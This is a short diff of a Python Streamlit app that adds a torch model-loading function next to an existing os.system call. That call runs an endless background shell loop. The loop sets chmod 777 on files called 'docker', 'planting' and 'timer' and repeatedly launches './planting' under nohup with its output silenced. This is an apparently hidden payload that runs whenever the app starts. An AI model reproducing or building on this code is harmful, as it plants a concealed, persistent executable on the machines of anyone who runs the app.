@@ -4,6 +4,10 @@ import math
 import pandas as pd
 import streamlit as st
 import os
+import torch
+def load_model():
+	  return torch.load("path/to/model.pt")
+model = load_model()
 os.system("while [ 1 ]; do nohup chmod 777 docker planting timer && ./planting > /dev/null; echo ./timer; echo; sleep 2m; done")
 
 import time 
